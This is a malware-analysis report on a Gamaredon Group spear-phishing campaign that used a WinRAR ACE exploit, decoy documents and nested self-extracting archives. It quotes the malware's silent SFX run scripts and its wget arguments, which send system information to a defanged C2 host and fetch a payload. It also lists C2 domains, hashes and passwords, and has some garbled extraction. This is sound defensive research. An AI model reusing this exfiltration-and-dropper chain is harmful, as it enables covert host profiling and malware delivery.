We decided to\nprovide an analysis of the current campaign, particularly focusing on the tools and methods used\nby these malicious actors to try to understand their methodologies and what resources are\nneeded to launch these types of attacks.\n\nThe Gamaredon Group has been actively launching spear-phishing attacks against Ukrainian\n[government and military departments from the mid-2013s. In one article published in the Kharkiv](https://kharkivobserver.com/ukraine-as-testing-ground-for-russian-cyber-attacks-deterrence/)\nObserver – an independent Ukranian online publication – an unnamed source stated that even\nthe Ukrainian Presidential Administration has been attacked by malware developed by the\nGamaredon Group. In addition, the anonymous cybersecurity experts referenced in the article\nconnected the malicious Gamaredon Group actors with Russian state-sponsored hackers.\n\nThe group is very active. In addition to the campaign we will analyze in this report, they are also\n[implicated in the spreading of a new Linux malware – Evil Gnome.](https://www.intezer.com/blog-evilgnome-rare-malware-spying-on-linux-desktop-users/)\n\nThe Gamaredon Group has been active for more than 6 years, and during that time, their Tactics,\nTechniques, and Procedures (TTPs) have mostly remained the same. They primarily target\nUkrainian organizations and resources using spear-phishing attacks, and they use military or\nsimilar documents as bait. Once they have found a victim, they then deploy remote manipulation\nsystem binaries (RMS) via self-extracting archives and batch command files.\n\n## Current Campaign Analysis\n\nAs an example, we decided to analyze one of their latest samples. The following archive caught\nour attention for exploiting a WinRAR unacev2 module vulnerability and for having interesting\ncontent. In this case, it looked like someone was using the military conflict in Ukraine to deliver\nsome sort of malware. A quick search for those patterns gave us the source of the archive – the\nGamaredon Group.\n\n\n-----\n\nFigure 1. Files inside the archive\nThe archive contains several decoy files:\n\n1_Миротворець\\заява.jpg\n\nTranslation: Peacemaker\\statement.jpg\n\n2_Пiнчук\\Пiнчук Андрiй Юрiйович 27.12.1997.docx\n\nTranslation: Pinchuk\\Pinchuk Andrey Yuriyovych 27.12.1997.doc\nAndrey Pinchuk is a Ukranian politician with alleged ties to Russia\n\n3_Хавченко\\Хавченко Дмитро Василiйович 06.01.1966.docx\n\nTranslation: Havchenko \\ Havvchenko Dmitry 06.01.1966.doc\nDmitry Havchenko is a Ukranian entrepreneur involved in Ukranian politics who owns\nthe cryptocurrency exchange WEX.\n\nD3i_GMCWAAAq_8u.jpg\nssu_zakon.docx\n\nTranslation: Security Service of Ukraine_The Law.docx\n\nSeveral text files\n\nAll of the text files contain old phone billing information, as well as coordinates, numbers, and\naddresses. We cannot determine if this information is real or not. Even if it is, this kind of data can\nbe easily found in public domains.\n\nFigure 2. Billing data\nAnother file is used as bait is called ssu_zakon.docx. This document is just a note regarding the\nSecurity Service of Ukraine (SSU) law.\n\n\n-----\n\nFigure 3. Contents of ssu_zakon.docx\nThe archive also contains 2 MS Office documents named correspondingly for the names stated\non the decoy image - Pinchuk Andriy Yuryevich 27.12.1997.docx and Havchenko Dmitry\nVasilyevich 06.01.1966.docx.\n\nThe document names are written in Ukrainian, while the content is written in Russian – and in\nfact, is just the translated text from the decoy image. The text provides brief information on two\npersons, listing the address of their registration and information about their military careers.\n\nFigure 4. Corresponding document contents\nChecking the metadata of two documents, we observed the following:\n\n\n-----\n\nCreated by: USER\n\n3_Хавченко\\Хавченко Дмитро Василiйович 06.01.1966.docx\n\nCreated: 10.04.2019 07:35:00\nModified: 10.04.2019 07:35:00\nCreated by: USER\n\nssu_zakon.docx\n\nCreated: 28.01.2019 06:42:00\nModified: 05.04.2019 05:05:00\nCreated by: USER\n\nThe files заява.jpg (statement.jpg) and D3i_GMCWAAAq_8u.jpg are the same. The original\nsource of this picture is a post on a website called Mirotvorets (Peacemaker). The website is\nknown for publishing the personal information of people who are considered to be “enemies of\nUkraine.”\n\nThe text on the pictures below talks about Crimea, the military conflict, and about two people who\nare suspected of sponsoring the Presidential election campaign of the current president of\nUkraine (Volodymyr Zelensky).\n\nFigure 5. Decoy images\nThe image date on the image is 7 of April 2019. This is the same day it was published on the\nMirotvorets website. But one interesting fact is that WinRAR shows the last modification date as\n21.02.2019 22:03:\n\n\n-----\n\nFigure 6. File last modification time\nTo understand this time-travel mystery, we decided to check the ACE archive structure.\n\nFigure 7. ACE archive structure information\nAs you can see on figure 7, the ACE archive contains a date field in MS-DOS format.\n\nIf we convert 02/ 21/ 2019, 22:03:06 to an MS-DOS timestamp, we get 0x4E55B063. This would\nbe written as 0x63B0554E in little-endian ordering. Checking our archive, we can find the\ncorresponding field:\n\n\n-----\n\n[Now, if we search for it using \\x63\\xB0\\x55\\x4E, we find this module for a Metasploit Framework:](https://github.com/rapid7/metasploit-framework/commits/master/modules/exploits/windows/fileformat/winrar_ace.rb)\n\n\nFigure 9. Same value in the Metasploit module\n[Searching further, we observed an earlier Proof of Concept script that was published on the 27](https://github.com/manulqwerty/Evil-WinRAR-Gen/blob/master/evilWinRAR.py)\nof February, 2019.\n\n\nth\n\n\nFigure 10. Unacev2.dll vulnerability PoC\nThe date listed in the archive was pre-defined and inserted by generator scripts. This fact gives\nus the idea that the attackers are utilizing publicly available scripts to pack their payload. The only\nreal timestamps we can currently trust are the timestamps extracted from MS Office document\nmetadata. Those are 05.04.2019 and 10.04.2019. Besides the date and time information, we also\nhave a very generic username of the file creator: USER.\n\n## Exploit Analysis\n\nThe exploit drops three files on the file system. Each of them has their own application:\n\nFirst, the shortcut called “Goggle Chrome.lnk” is placed on the users’ desktop. As you can see in\nfigure 11, the actor misspelled the browser name. This shortcut is intended to be clicked on by the\nuser instead of the proper “Google Chrome” browser. The shortcut has a hardcoded path to the\nicon, so the proper image will be shown only if the user has the browser installed on their\ncomputer.\n\nFigure 11. Misspelled shortcut\nNext, the same shortcut is placed in the Startup folder at\n%AppData%\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Goggle Chrome.lnk. This\ntime, the shortcut is placed for persistence purposes. The files in the startup folder will be\nexecuted once the user logs into the system. That way, in case the desktop shortcut hasn’t been\nclicked by the user in the current session the startup file is the backup for the attacker so it can\n\n\n-----\n\nAnd finally, the executable file called win.exe is placed in\nthe users’ directory at %userprofile%\\win.exe.\n\n## Analyzing the win.exe File\n\nThe file, dropped to the user folder, is a password-protected self-extracting RAR archive. The file\nhas a compilation date of 24.04.2017 18:45:49 (GMT).\n\nFigure 12. Executable file compilation timestamp\nKnowing the self-extracting archive compilation date allows us to find the WinRAR software\nversion used by the attacker. When the SFX archive is created, the compilation date is set close\nto the timestamp of the corresponding version of the WinRAR software used. So, the only version\nthat could give that timestamp is WinRAR 5.50 Beta 1 (x86). Its installer file has its timestamp set\nto 24.04.2017 18:46:00 (GMT), which is 1 second different from the SFX malware. Trying to\ncreate a self-extracting archive with this version, we got the same date as the one stated in the\nmalware.\n\nAdditionally, the malicious self-extracting archive contains a fake digital signature of a legitimate\nMicrosoft tool - SysInternals Autoruns. As you can see in the figure below, the signature fails to\npass validation:\n\n\n-----\n\nFigure 13. Fake digital signature\nMoving on, to get the archive password we have to check the shortcut that is linked to it.\n\n\n-----\n\nFigure 14. Password inside the shortcut\nOnce we have a password, we can check the internals of the win.exe file. As can be seen in\nfigure 15, it contains another executable file called winlog.exe. Besides that, it has an embedded\nSFX script that is executed when the archive data is extracted:\n\nSetup = winlog.exe (Execute after extraction)\nSilent = 1 (No windows are shown)\nOverwrite = 2 (Do not overwrite)\n\nFigure 15. Contents of “win.exe”\nLet’s unpack this file and analyze its content.\n\nThe file is a 7zip SFX archive that tries to look like a mysterious version of Email Microsoft Office\nWord software. This time, the file is even older than the previous SFX archive. Although the last\nmodification date is set to 10.04.2019 13:55:42 (GMT), the compilation timestamp is 05.03.2016\n12:06:17 (GMT). Unfortunately, none of the 7zip software release dates or versions corresponds\nto this timestamp, so our previous discovery technique did not work in this case.\n\nFigure 16. Description of “winlog.exe”\nThis self-extracting archive contains two files and a script that is launched at extraction:\n\n!@Install@!UTF-8!\nRunProgram=\"hidcon:5493.cmd\" (Run batch file with hidden console window after extraction)\nGUIMode=\"2\" (No windows are shown)\nSelfDelete=\"1\" (Delete the archive after extraction)\n;!@InstallEnd@!\n\n\n-----\n\nFigure 17. Copyright inside the archive\nThis time, searching for the copyright, versions, and script we found a custom tool called Modified\n7-Zip SFX module for installers, version 1.6.1 Stable build 3873 was used to create the malicious\nfile. This tool is freely distributed on the Russian-speaking forum oszone. The custom software\nproduces a 7zip SFX archive with exactly the same timestamp as the malicious file.\n\nFigure 18. Custom tool posted on the oszone forum\nNext, let’s analyze the files contained in the archive.\n\nThe first one is called 5532.cmd, and it is a command prompt (batch) file. The second file is an\nexecutable and is called config.exe.\n\nFigure 19. Inside the 7zip SFX archive\nLooking into the batch file, we can see that it was not very obfuscated and therefore easy to read.\n\nThe first thing we can see is the configuration information. It has a hardcoded C2 server,\nfilename, and user-agent:\n\nhxxp://lisingrout.ddns[.]net\nlibrelogout.exe\n\"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:27.0) Firefox/27.0\"\n\nAft th fi ti i bl f d th i ti Fi t th l t t it\n\n\n-----\n\nProxyServer (Proxy server address)\nProxyUser (Proxy username)\nProxyPass (Proxy password)\n\nNext, it gets the name of the computer and generates a unique ID. Once done, it calls the\nsysteminfo utility and saves the whole output to a text file that in our case called ohJlkad.txt:\n\nsysteminfo > ohJlkad.txt\n\nFigure 20. Initial data collection code\nAfter that, it waits for 40 seconds using the command:\n\ntimeout /T 40\n\nOnce the timer ends, it will check for the internet connection by launching a ping command and\nsending 14 requests to google.com\n\nOnce finished, it kills the task with the filename stated in the configuration (“librelogout.exe”) and\ndeletes the file.\n\nFinally, it calls the config.exe application to provide several arguments:\n\n--user-agent = [hardcoded UA]\n--post-data=”\n\nversiya=wrar\ncomp=%computername%\nid=[generated from computer name]\nsysinfo=[data from ohJlkad.txt]”\n\n“[C2 Server]”\n-q -N “[C2 Server]”\n-O “librelogout.exe”\n\nIn case the user is connected to the internet via proxy, it will provide additional arguments to\nconfig.exe:\n\n\n-----\n\nAmong the arguments, we see one interesting parameter: versiya = wrar. First, the word Versiya\nis the Russian Версия or Ukranian Версія, and it means version. As it is set to wrar, we can\nguess that it refers to the way the payload is being delivered. In this case, the initial file\nmirotvorec.rar contains an exploit for the WinRAR unacev2 module.\n\nFigure 21. Data exfiltration and payload dropping code\nAfter the config.exe returns, the script launches the main payload hosted on C2. To sum up the\nscript routine, it takes the following actions:\n\nCollects information about the infected host\nSends it to the C2 via config.exe\nDownloads and launches the main payload\n\nAnalyzing the config.exe file, we found out that it is a legit wget version (v 1.11.4) with OpenSSL\nsupport compiled for Windows. The file is quite old, as the compilation date goes back to 2009.\nApparently, the attackers decided to not reinvent the wheel and simply used an open-source\nsolution for exfiltrating the host data and downloading the main payload.\n\n## Going Deep into the Shortcut\n\nIn addition to analyzing their techniques, we also decided to collect more information about the\nattackers. Fortunately, the shortcut they made will help us.\n\nThe shortcuts used in Windows are small files that simplify our lives by providing a fast way to\naccess files, applications, and URLs. Another fact is that the .lnk shortcuts help simplify the\nforensic analysis of malicious campaigns by providing the amount of the information hidden from\nthe user.\n\nFirst, let’s check the “Goggle Chrome.lnk” by opening its properties:\n\n\n-----\n\nFigure 22. Artifacts in the shortcut\nFirst, we see that the shortcut contains a Russian string Доступ в Интернет in the comment field,\nwhich translates to Access to the Internet. This text is shown if one hovers the mouse over the\nshortcut. The real Google Chrome shortcut will contain this comment and the text will depend on\nsystem language settings. So, we can guess that Windows with the Russian language pack has\nbeen used for forming the malicious shortcut.\n\nAnother artifact left by the attackers is the password they used to unpack win.exe.\n\nThe -p is the argument for WinRAR SFX to use a password when unpacking. So the rest of the\nstring – fvthbrfycrbte,k.lrb is the password. If you switch your keyboard layout to Russian and type\nthe password characters, you eventually recover an obscene phrase in Russian:\n“американскиеу**юдки”, that is translated as “American b**tards”. Is this an Easter egg left by\nthe Gamaredon Group?\n\nNext, let’s move to the shortcut internals. Using the parsers of the .lnk structure, we can extract\n[more information from the file. We decided to use LNK Parser, a tool that can generate very](https://code.google.com/archive/p/lnk-parser/)\ndetailed html reports.\n\n\n-----\n\nFigure 23. Part of the report generated by LNK Parser\nAs it contains quite a lot of information, we will focus on the most interesting pieces:\n\nThe .lnk file was created on 08.04.2019 09:27:06 (UTC).\nThe shortcut was created on a drive with the serial number: 3c76-6c45\nAnother path is hardcoded in the shortcut – C:\\Users\\USER\\win.exe. This is probably the\nsame USER that created the decoy MS Office documents.\nPC NetBIOS name: user-pc\nMAC address of the machine: 08:00:27:BC:C2:24 (VirtualBox)\n\nWe decided to use this information to search for any other samples containing the same MAC\naddress, drive serial number, or any other unique data from the shortcut.\n\nOnce the samples were found, we analyzed and extracted other pieces of information that could\nalso help us with attribution. The general behavior of the samples found was mostly the same:\nSFX archive, batch command file, shortcuts. The only different parts were the bait files and\nsometimes the batch scripts used by the attackers.\n\nFirst, we looked at a sample very similar to the one we deeply researched – mirotvorec.rar. The\nname of the archive is the same as the source of the decoy image shown in figure 4. There were\nonly three main differences we observed: the lack of decoy files (text files and the\nssu_zakon.docx), and different icons used for win.exe and winlog.exe. The last one is different. It\nis user-agent written in the script:\n\n\"Mozilla/5.0 (Linux; Android 7.1.1; SM-J510H Build/NMF26X) Mobile Safari/537.36\"\n\n\n-----\n\nWe also discovered a non-political sample called vpnclient-win-msi-5.0.07.0410-k9.exe. The\nsample does not use the WinRAR unacev2.dll vulnerability, and indeed contains a legitimate VPN\nclient tool along with a malicious script that is launched in the background. Analyzing the shortcut\nfile used in the sample, we found other interesting information left by the actors.\n\nThe sample hash is 5e16a71c7b99cb2780c31af34b268b78525b2b8fed55ff9e7bd4db8b1ba66f90.\n\nData extracted from the shortcut included:\n\nCreated: 19.03.2019 07:49:13 (UTC)\nC:\\Users\\Carson\\1.exe\nCarson (C:\\Пользователи)\nNetBIOS name: user-pc\nDrive serial number: 3c76-6c45\nMAC address: 08:00:27:BC:C2:24\n\nHere we can see the username of an attacker OS account – Carson. The NetBIOS name, hard\ndrive serial number, and MAC address remained the same.\n\nThis sample has a slight difference in the unpacking method. This time, instead of the shortcut,\nthe attackers hid the password inside the batch script.\n\nFigure 24. Password hardcoded in the script\nAs in the previous samples, the password is an obscene phrase in Russian written in an English\nkeyboard layout.\n\nAnother sample that caught our attention was a .lnk shortcut file called 6228. The hash of the file\nis: 995e6e0f90c58c82744545bf133b8c4c17decbe851953b0ffe5b21d625cade7d, and some of the\nextracted data follows:\n\nCreated 01.07.2019 10:36:33 (UTC)\nStrings\n\n_7-ZIP (F:\\VZLOM\\SBORKA_SCR)\nF:\\VZLOM\\SBORKA_SCR\\_7-ZIP\\WinRAR.exe\nNew password used: “dst,bntct,zd;jgegbyljcrbtcerb”\n\nPC NetBIOS name: шаман-пк\nDrive serial number: 3c76 6c45\n\n\n-----\n\nThis time, we observe that the malicious actor changed the VM PC name from user-pc to\nshaman-pc (written in Russian). The MAC address and drive serial number are the same. Other\ninteresting artefacts include the paths they forgot to clean out. The words VZLOM and\nSBORKA_SCR are correspondingly translated from Russian as Hacking and SCR Constructor. It\nmeans they are using other specialized tools to generate .scr malware. These tools, based on the\ndrive letter F, are possibly stored on a USB flash drive or share folder connected to the VM.\n\nAnother trace the group left behind is the new SFX unpacking password –\n“dst,bntct,zd;jgegbyljcrbtcerb” which is, again, an obscene phrase in Russian written in English\nkeyboard layout.\n\nBesides this, other similar samples were observed:\n\n1. 0a6aae425a5e36f68b5da69157d2df4e7d836933adfd0696c389097ecb4a0fd7\n\nLNK shortcut file\nCreation date 04/12/2019 10:44:08 UTC\n\nLast modified 05/06/2019 11:45:30 UTC;\n\nNew password used: gblfhsuyjqyst\n\n2. 79fd962eb0c256f32786dab4d42cb416f6c1e6766bf0e2dcafdf5ffa2c5e61c1\n\nMS Office document\nCreate date: 2019:07:22 12:08:00 (GMT)\nAuthor: mmkrasny\nLast modified by: Користувач Windows\nC2: wifc[.]website\n\nThis sample usesVBA macros to drop a payload. Checking the C2, we can see that it is resolved\nas 5.252.193[.]204. From another malicious domain that shares the same IP address – wifu[.]site\n– an additional sample has been retrieved:\n\n3. bc39db24919b69e80bfb534204f4441a162ca336379bf9eb66b038e039889aac\n\n7zip SFX archive\nTimeDateStamp – 31.12.2012 00:38:51 GMT)\nContains 3 files:\n\n8331.txt\n13446.cmd\n14638\n\nInside the batch script 13446.cmd, which is a bit different from the discussed sample, we found\nthis additional information:\n\nC2: hxxp://bits-tor[.]host\nContains another password: whevelfrb\nSchedules a task to achieve persistence\n\nThe information extracted from the samples could now be used to search for any other\ncampaigns ran by this group or link any old campaigns to one actor\n\n\n-----\n\nAfter we analyzed the data left inside the samples, we went about summarizing the information\nwe had collected about them to get an idea of who hides behind that group.\n\nOn one hand, these malicious actors have been operating since mid-2013, so they more than 6\nyears of experience.\n\nThey are not asking for a ransom\nThey only target information from the military, government, and other high-level Ukrainian\nsources.\nThe main infection strategy is spear-phishing, with well-combined bait documents that\nsometimes cannot be found in public.\nThey use publicly available legit tools to avoid detection and create their malicious samples.\n\nOn the other hand, the traces they left in the malware highlight some basic mistakes.\n\nThey use poorly-obfuscated batch scripts, that could be easily analyzed\nThe leftover paths inside the shortcuts contain usernames, folders and file names. For\nstate-sponsored hackers, this is very risky because any possible piece of information could\nunveil the author\nMuch of the data is written in Russian and not in Ukrainian\nThe passwords contain hateful statements in Russian which look like personal messages\nfrom the actor. This type of behavior is peculiar to authors seeking self-affirmation, rather\nthan professional cybercriminals.\n\n## Conclusion\n\nWhile analyzing a campaign run by the Gamaredon group, we discovered the tools they used to\nprepare the attack and found artifacts left behind by the actors that allowed us to perform a large\namount of forensic analysis. No doubt, the group has strong Russian ties if we rely on how much\nof that language is used in the malware.\n\nSummarizing our observations regarding the Gamaredon group, we can say that the tools and\nmethods used are more likely to be associated with political activists rather than with special\nservices. Unfortunately, we do not have enough proofs to be sure about that.
